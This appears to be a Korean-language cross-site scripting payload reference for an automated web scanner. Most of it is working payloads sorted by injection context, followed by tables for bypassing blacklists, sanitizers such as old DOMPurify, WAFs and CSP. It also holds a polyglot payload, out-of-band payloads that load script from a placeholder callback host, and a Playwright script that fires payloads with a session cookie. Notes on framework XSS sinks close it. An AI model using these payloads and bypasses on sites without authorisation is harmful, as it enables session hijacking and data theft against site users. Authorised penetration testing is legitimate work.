### 기본 페이로드

#### Reflected
- `<script>alert(1)</script>` (HTML body) — 기본
- `<img src=x onerror=alert(1)>` (HTML body) — `<script>` 차단 시
- `<svg/onload=alert(1)>` (HTML body) — 짧은 페이로드 (28자)
- `<svg><animate attributeName=onload values=alert(1) />` (HTML body) — animate 변형
- `<details/open/ontoggle=alert(1)>` (HTML body)
- `<body onload=alert(1)>` (HTML body 직접)
- `<input autofocus onfocus=alert(1)>` (HTML body)
- `<marquee onstart=alert(1)>` (HTML body)
- `<video><source onerror=alert(1)>` (HTML body)
- `<isindex action=javascript:alert(1) type=image>` (구 브라우저)

#### Stored
- 1차: 댓글/닉네임/프로필/리뷰/이메디터 등에 위 페이로드 저장
- 2차: 해당 데이터를 출력하는 페이지(`Accept: text/html`) 방문
- SPA: Playwright로 alert dialog/DOM 검증

#### DOM (서버 미경유는 dom-xss-scanner 위임)
- `#<img src=x onerror=alert(1)>` (location.hash)
- `?q=<svg/onload=alert(1)>` (URL encoded query)

#### 컨텍스트별

| 컨텍스트 | 페이로드 |
|---|---|
| HTML body | `<script>alert(1)</script>`, `<img src=x onerror=alert(1)>` |
| HTML 속성 (quoted) | `" autofocus onfocus=alert(1) x="` |
| HTML 속성 (unquoted) | ` onmouseover=alert(1)`, `/onmouseover=alert(1)/` |
| `<script>` 블록 (string) | `';alert(1);//`, `\';alert(1);//` |
| `<script>` 블록 (template) | `${alert(1)}`, `</script><script>alert(1)//` |
| `href`/`src` 속성 | `javascript:alert(1)`, `data:text/html,<script>alert(1)</script>` |
| CSS `style` | `background:url("javascript:alert(1)")`, `expression(alert(1))` (구 IE) |
| `<style>` 블록 | `</style><script>alert(1)</script>` |
| JSON in HTML script | `</script><script>alert(1)//` |
| SVG 컨텍스트 | `<svg xmlns="http://www.w3.org/2000/svg"><script>alert(1)</script></svg>` |

#### OOB / Blind
- `<img src=//CALLBACK.oast.fun/x>` — 외부 fetch 발생 시 확인
- `<script src=//CALLBACK/x.js></script>` — JS 실행 발생 시 확인

#### 도구 선택

| 렌더링 | 도구 | 검증 |
|---|---|---|
| 서버 (ERB/Slim/Jinja2/JSP/Blade) | curl + `Accept: text/html` | 응답 본문에 escape 없이 반영 |
| 클라이언트 (React/Vue/Angular `dangerouslySetInnerHTML`) | Playwright | `dialog` 발화 또는 DOM 삽입 |

#### Playwright 검증 스크립트
```javascript
const { chromium } = require('playwright');
(async () => {
  const b = await chromium.launch({ headless: true });
  const ctx = await b.newContext();
  await ctx.addCookies([{ name:'SESSION', value:'<v>', domain:'<d>', path:'/' }]);
  const p = await ctx.newPage();
  let fired = false;
  p.on('dialog', async d => { fired = true; await d.dismiss(); });
  await p.goto('https://target/path');
  await p.waitForTimeout(2000);
  console.log('XSS:', fired || await p.evaluate(() => document.body.innerHTML.includes('<img src=x')));
  await b.close();
})();
```

---

### 우회 페이로드

| 방어 | 페이로드 |
|---|---|
| 키워드 블랙리스트 (`<script>`) | `<sCrIpT>alert(1)</sCrIpT>`, `<scr<script>ipt>alert(1)</scr</script>ipt>`, `<svg><script>alert(1)</script></svg>`, `<iframe srcdoc="<script>alert(1)</script>">` |
| `alert` 차단 | `confirm(1)`, `prompt(1)`, `print()`, `(alert)(1)`, `top["al"+"ert"](1)`, `[].constructor.constructor("alert(1)")()` |
| `(` `)` 차단 | `<script>alert\`1\`</script>` (template literal), `onerror=alert;throw 1`, `<svg/onload=alert%26%23x28%3B1%26%23x29%3B>` (HTML entity) |
| 길이 제한 (≤50자) | `<svg/onload=alert(1)>` (28), `<img src=1 onerror=alert(1)>` (30), `<a href=javascript:alert(1)>x` (31) |
| `<` `>` HTML escape | 속성 컨텍스트 `<a href="${x}">`에서 `"` escape 누락 시 `" autofocus onfocus=alert(1) x="` |
| URL 스킴 블랙리스트 | `JaVaScRiPt:alert(1)`, `java%09script:alert(1)`, `java\x00script:alert(1)`, `data:text/html,<script>alert(1)</script>`, `vbscript:msgbox(1)`, `feed:javascript:alert(1)` |
| sanitize allowedTags | `<a>` 허용 → `<a href="javascript:alert(1)">`, `<img>` 허용 → `<img src=x onerror=alert(1)>`, `<form>` 허용 → `<form action=javascript:alert(1)><input type=submit>` |
| DOMPurify (구버전) | mXSS — `<form><math><mtext></form><form><mglyph><svg><mtext><style><img src onerror=alert(1)>` (CVE-2020-26870 변형) |
| DOMPurify (`USE_PROFILES`) | SVG profile만이면 `<svg><foreignObject><script>alert(1)</script></foreignObject>` |
| Trusted Types 미적용 | string sink 그대로 — TT 정책 없으면 모든 페이로드 통과 |
| WAF 키워드 (`onerror`) | `onerror /=alert(1)`, `onError`, `onpointerover=alert(1)`, `onfocus autofocus=alert(1)`, `onanimationstart=alert(1)` |
| WAF 정규식 우회 | `<svg><animatetransform onbegin=alert(1)>`, `<math><maction actiontype=statusline xlink:href=javascript:alert(1)>x</maction></math>` |
| URL 인코딩 검증 | Double encoding `%253Cscript%253E`, Unicode `\u003Cscript\u003E`, HTML entity `&lt;script&gt;` |
| CSP `script-src 'self'` | 동일 origin JSONP/dangling script (`/api/jsonp?cb=alert`), `data:` (CSP에 허용 시), JS gadget (Bootstrap/AngularJS 등) |
| CSP `unsafe-inline` 차단 | `<base href=//evil>` 으로 상대 경로 script src 변조, dangling script tag |
| CSP nonce | nonce 누출 (응답 본문/JS에 노출 시 재사용), DOM clobbering으로 nonce 우회 |

#### Polyglot (다중 컨텍스트 동시 트리거)
```
jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0D%0A//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e
```

#### Markdown XSS (marked/markdown-it `html: true`)
```
[click](javascript:alert(1))
![alt](x" onerror=alert(1) ")
<script>alert(1)</script>
```

---

### 참고사항

- React JSX `{value}` 자동 escape — `dangerouslySetInnerHTML`만 위험
- Vue `{{ }}` 자동 escape — `v-html`만 위험
- Angular `{{ }}` 자동 escape — `[innerHTML]`/`bypassSecurityTrustHtml`만 위험
- Svelte `{value}`, Solid `innerHTML={x}`, Astro `set:html={x}`도 동일 — 비-escape 변형만 sink
- `renderToStaticMarkup`/`renderToString` 내부 `dangerouslySetInnerHTML`은 즉시 실행 안 됨 — 반환 문자열 흐름 추적 필수
- 에러 메시지 반사(`error.message` → `innerHTML`)가 자주 누락되는 sink
- markdown 렌더러 `html: true` 옵션은 sanitize 우회 — marked/markdown-it 기본 비활성
- SVG 업로드 inline 렌더는 stored XSS — file-upload-scanner 결합
- `Content-Type: text/html` 외 `application/xhtml+xml`, `image/svg+xml`도 script 실행
- Stored XSS 검증은 다중 계정 필수 — 1차 저장 + 2차 다른 사용자 세션에서 트리거
- Trusted Types CSP (`require-trusted-types-for 'script'`) 헤더 부재는 영향도 가산
- `javascript:` 스킴은 `<a>`/`window.location` sink에서만 — 단순 텍스트 출력은 무해
- mXSS는 브라우저 HTML 재파싱 시점 변형 — DOMPurify 옵션/버전 점검
- WAF 차단은 안전이 아닌 "우회 시도 필요" 신호 — 위 우회 표 모두 시도
- `<script>` 블록 안 사용자 입력은 JS escape (`\u003c` 등) 필요 — HTML escape는 무용
- jQuery `.html()`, `$(el).append()`는 클라이언트 sink — Playwright 필수
- Service Worker / WebSocket / postMessage source는 Playwright로만 검증 가능
- DOM clobbering은 별도 영역 — `<form name=x>` 같은 ID/name 충돌
